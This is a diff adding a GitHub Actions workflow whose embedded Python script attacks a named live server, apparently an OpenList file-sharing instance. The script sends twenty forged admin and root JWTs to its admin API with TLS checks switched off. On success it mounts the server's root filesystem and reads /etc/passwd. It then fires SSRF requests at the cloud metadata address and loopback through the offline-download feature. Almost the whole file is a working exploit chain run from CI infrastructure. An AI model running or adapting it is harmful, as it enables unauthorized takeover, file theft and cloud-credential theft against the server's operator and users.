@@ -1,0 +1,97 @@
+name: openlist-admin-forge-i3231
+on:
+  workflow_dispatch:
+    inputs:
+      ref:
+        description: 'git ref'
+        required: false
+        default: 'main'
+permissions:
+  contents: read
+jobs:
+  forge-test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Test forged admin JWTs + SSRF control (zero own-IP relay)
+        run: |
+          set +e
+          python3 - <<'PY'
+          import json, urllib.request, ssl, urllib.error
+          B="https://pan.yazinb.icu"
+          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          TOKENS = [{"label":"shape=top user=admin pwd_ts=0 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6ImFkbWluIiwicHdkX3RzIjowfQ.qkJEVP4mwmBqZnIglKMxWSmLtKq04BN0ZV1sBJn8idk"},{"label":"shape=top user=admin pwd_ts=1 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6ImFkbWluIiwicHdkX3RzIjoxfQ.K1A0s0ydmVyPkEr6R5ydep6VV86mjydw7awQvzgFZQs"},{"label":"shape=top user=admin pwd_ts=2 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6ImFkbWluIiwicHdkX3RzIjoyfQ.z7HC0QNwY8J7xDJXOn4FahI8xT2XmwmOVf0-_FuASxQ"},{"label":"shape=top user=admin pwd_ts=1750000000 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6ImFkbWluIiwicHdkX3RzIjoxNzUwMDAwMDAwfQ.RL4zpVLbJi26MN_gauOlqJAW0WwMAoJam53f-Gxv23k"},{"label":"shape=top user=admin pwd_ts=1794546818 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6ImFkbWluIiwicHdkX3RzIjoxNzk0NTQ2ODE4fQ.KRBVBB6tdT_lUepLW3QEwvdBkIAltP_stfZaxexapRI"},{"label":"shape=top user=root pwd_ts=0 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6InJvb3QiLCJwd2RfdHMiOjB9.4VXu9dYhEfr5A9uEIllZNP2gXj5Xw14f4RE5hpBm9DU"},{"label":"shape=top user=root pwd_ts=1 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6InJvb3QiLCJwd2RfdHMiOjF9.0PuuG_s6LdZL58CpwC7wATknMhafwrC6w7JirUmkM64"},{"label":"shape=top user=root pwd_ts=2 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6InJvb3QiLCJwd2RfdHMiOjJ9.Jm0hUmtITjVRwszhV0vGJf9m_icgdrYino_QubRk7JQ"},{"label":"shape=top user=root pwd_ts=1750000000 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6InJvb3QiLCJwd2RfdHMiOjE3NTAwMDAwMDB9.gtx-udcXuN3WC-NOM8nE2jPP9Ij6rpSarKeVX2hQcms"},{"label":"shape=top user=root pwd_ts=1794546818 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJ1c2VybmFtZSI6InJvb3QiLCJwd2RfdHMiOjE3OTQ1NDY4MTh9.ilYG5xVNxc5aQVLMcTKUH9zqzSHd6wAYNgZejOlq794"},{"label":"shape=data user=admin pwd_ts=0 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwd2RfdHMiOjB9fQ.PFmomUCjPfO4SlzzgH4wfbDi7WSMMsAt_SDTWD3Ccp0"},{"label":"shape=data user=admin pwd_ts=1 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwd2RfdHMiOjF9fQ.JG2MlVyrRmv0CE21VeXJYk0608ej8QXWRDsU0EpB-gI"},{"label":"shape=data user=admin pwd_ts=2 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwd2RfdHMiOjJ9fQ.MPh46wfttSvh-RVoqydaAHM9uJRfUJ-FbBNFXH6R22U"},{"label":"shape=data user=admin pwd_ts=1750000000 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwd2RfdHMiOjE3NTAwMDAwMDB9fQ.Ga3Cn2Tm9Ffztgms9DIsNt5BEHhll3Dp1oqVIRylx_w"},{"label":"shape=data user=admin pwd_ts=1794546818 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwd2RfdHMiOjE3OTQ1NDY4MTh9fQ.-fHHs0Wo9uoSKDf8YpPvw4VPFrhFIrxJ-X60tEsBWb4"},{"label":"shape=data user=root pwd_ts=0 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoicm9vdCIsInB3ZF90cyI6MH19.q69CpxmBTFWQHh0G_qvQAante8Hm0HPkH5_pdEhLzsA"},{"label":"shape=data user=root pwd_ts=1 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoicm9vdCIsInB3ZF90cyI6MX19.IKX-v7R0LZUZdQtdQicY3oQjlWrOufJrw8a9N-FOLqE"},{"label":"shape=data user=root pwd_ts=2 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoicm9vdCIsInB3ZF90cyI6Mn19.RMEnXognpEXYUXl8Lw97vtV0bYWN2hmYAffIx7SaORE"},{"label":"shape=data user=root pwd_ts=1750000000 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoicm9vdCIsInB3ZF90cyI6MTc1MDAwMDAwMH19.PQGs666VQqJKyVN5Iqh_0z8S3A3hZkjZpKNy03VDUSA"},{"label":"shape=data user=root pwd_ts=1794546818 verify=OK","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTQ1NTQwMTgsImlhdCI6MTc5NDU0NjgxOCwibmJmIjoxNzk0NTQ2ODA4LCJkYXRhIjp7InVzZXJuYW1lIjoicm9vdCIsInB3ZF90cyI6MTc5NDU0NjgxOH19.LDbjuDDr6wZjbmRO2yWd50GKj_bFD-OK4MCrimM_d6E"}]
+          def req(method,path,token=None,body=None,timeout=40):
+              h={'User-Agent':'Mozilla/5.0','Accept':'application/json, text/plain, */*'}
+              if token: h['Authorization']=token
+              data=None
+              if body is not None:
+                  data=json.dumps(body).encode('utf-8'); h['Content-Type']='application/json'
+              r=urllib.request.Request(B+path,data=data,headers=h,method=method)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=timeout,context=ctx)
+                  return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8','replace')
+              except Exception as e:
+                  return -1, 'ERR:'+str(e)
+          def jget(b):
+              try: return json.loads(b)
+              except: return {}
+          # control: guest login
+          s,b=req('POST','/api/auth/login',body={"username":"guest","password":"guest"})
+          j=jget(b)
+          print("GUEST_LOGIN", s, "code=", j.get('code'), "tok_len=", len((j.get('data') or {}).get('token','') or ''))
+          G=(j.get('data') or {}).get('token','')
+          if G:
+              s2,b2=req('GET','/api/me',G)
+              d2=jget(b2)
+              print("GUEST_ME", s2, "code=", d2.get('code'), "username=", ((d2.get('data') or {}) or {}).get('username'))
+          PASS=[]
+          for t in TOKENS:
+              tok=t['token']
+              s,b=req('GET','/api/me',tok)
+              d=jget(b)
+              un=None
+              if isinstance(d.get('data'),dict): un=d.get('data',{}).get('username')
+              print("TOKEN[%s] /api/me => %d code=%s username=%s" % (t['label'], s, d.get('code'), un))
+              s3,b3=req('POST','/api/admin/setting/list',tok,{})
+              d3=jget(b3)
+              ok = (s3==200) and (d3.get('code',-1) in (200,0))
+              print("TOKEN[%s] /api/admin/setting/list => %d code=%s admin_ok=%s" % (t['label'], s3, d3.get('code'), ok))
+              if ok: PASS.append(t)
+          print("ADMIN_POSSIBLE=", bool(PASS))
+          if PASS:
+              ADM=PASS[0]['token']
+              print("=== ADMIN JWT ACCEPTED (label=%s) ===" % PASS[0]['label'])
+              s,b=req('POST','/api/admin/setting/list',ADM,{})
+              print("SETTINGS_LEN", len(b))
+              print("SETTINGS_HEAD", b[:1600])
+              # 1) Mount real server filesystem root as Local storage
+              s,b=req('POST','/api/admin/storage/create',ADM,{
+                  "mount_path":"/rootfs","driver":"Local","cache_expiration":30,"status":"work","remark":"",
+                  "addition":{"root_folder_path":"/","thumbnail":False,"thumb_cache_folder":"/","show_hidden":True,"version_util":"OpenList","region":"","bucket":"","endpoint":"","access_key":"","access_secret":"","bucket_path":""}
+              })
+              print("CREATE_LOCAL_STORAGE", s, b[:400])
+              # 2) list server filesystem root
+              s,b=req('POST','/api/fs/list',ADM,{"path":"/rootfs","page":1,"per_page":200,"refresh":True})
+              d=jget(b)
+              items=(d.get('data') or {}).get('content',[]) or []
+              print("ROOTFS_LIST_STATUS", s, "code=", d.get('code'), "count=", len(items))
+              print("ROOTFS_ITEMS", [x.get('name') for x in items][:60])
+              # 3) read /etc/passwd via mounted storage (arbitrary file read proof)
+              s,b=req('POST','/api/fs/get',ADM,{"path":"/rootfs/etc/passwd"})
+              d=jget(b); ru=(d.get('data') or {}).get('raw_url','')
+              print("PASSWD_RAWURL_OK", bool(ru), "len=", len(ru))
+              if ru:
+                  try:
+                      pb=urllib.request.urlopen(ru,timeout=60,context=ctx).read().decode('utf-8','replace')
+                      print("PASSWD_HEAD", pb[:600])
+                  except Exception as e:
+                      print("PASSWD_READ_ERR", repr(e))
+              # 4) SSRF via offline download to cloud metadata + loopback
+              for tgt in ["http://169.254.169.254/latest/meta-data/","http://127.0.0.1:80/","http://127.0.0.1:443/"]:
+                  s,b=req('POST','/api/fs/add_offline_download',ADM,{"path":"/rootfs/ssrf_out","urls":[tgt],"tool":"","delete_policy":"","as_task":False})
+                  print("OFFLINE_DL[%s]" % tgt, s, b[:300])
+          print("DONE")
+          PY
